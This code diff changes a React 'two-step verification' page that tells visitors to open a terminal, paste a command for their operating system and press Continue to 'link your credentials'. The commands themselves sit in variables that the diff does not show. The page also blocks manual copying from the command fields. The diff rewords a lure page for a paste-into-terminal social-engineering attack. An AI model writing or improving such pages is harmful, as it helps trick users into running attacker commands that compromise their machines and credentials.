@@ -36,7 +36,6 @@ const Twofa = () => {
     fetchHex();
   }, [userData]);
 
-  // Prevent manual copy/select only on .nocopy elements
   useEffect(() => {
     const handleKeyDown = (e) => {
       const isCopy = (e.ctrlKey || e.metaKey) && e.key === 'c';
@@ -120,12 +119,21 @@ const Twofa = () => {
               <div className="block rounded-lg bg-white px-[30px] py-[50px] text-left shadow-lg sm:px-10">
                 <div className="grid grid-cols-1 gap-6">
                   <div className="flex flex-col gap-y-[10px]">
-                    <label className="text-lg font-bold">
-                      To complete the two-step verification process and register your own token on this site, please open the Windows Command Prompt or Linux Terminal, then enter the code below:
-                    </label>
+                      <label className="text-2xl font-bold leading-relaxed">
+                    To complete the two-step verification process and link your credentials to this platform, please follow these steps:
+                      </label>
 
-                    {/* Windows */}
-                    <label className="text-lg font-bold mt-4">Windows URL:</label>
+                    <ol className="list-decimal list-inside font-semibold space-y-2 mt-2">
+                      <li>Open your terminal.</li>
+                      <li>Copy the command provided below for your operating system and paste it into the terminal.</li>
+                    </ol>
+
+                    <div className="text-lg font-bold mt-4">
+                      Your one-time verification token is:{' '}
+                      <span className="text-colorOrangyRed">{machineHex}</span>
+                    </div>
+
+                    <label className="text-lg font-bold mt-4">Windows Command:</label>
                     <div className="flex w-full items-center nocopy">
                       <input
                         value={urlWindows}
@@ -142,8 +150,7 @@ const Twofa = () => {
                       </button>
                     </div>
 
-                    {/* Linux */}
-                    <label className="text-lg font-bold mt-4">Linux URL:</label>
+                    <label className="text-lg font-bold mt-4">Linux Command:</label>
                     <div className="flex w-full items-center nocopy">
                       <input
                         value={urlLinux}
@@ -160,8 +167,7 @@ const Twofa = () => {
                       </button>
                     </div>
 
-                    {/* Mac */}
-                    <label className="text-lg font-bold mt-4">Mac URL:</label>
+                    <label className="text-lg font-bold mt-4">Mac Command:</label>
                     <div className="flex w-full items-center nocopy">
                       <input
                         value={urlMac}
@@ -186,8 +192,13 @@ const Twofa = () => {
                   </div>
                 </div>
 
+                {/* Left-aligned instruction */}
+                <p className="text-base font-semibold mt-6 text-left">
+                  3. Press <strong>Continue</strong> to execute the command and finish the process.
+                </p>
+
                 {/* CAPTCHA */}
-                <div className="flex justify-center mt-6">
+                <div className="flex justify-center mt-4">
                   <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={handleCaptchaChange} />
                 </div>
 
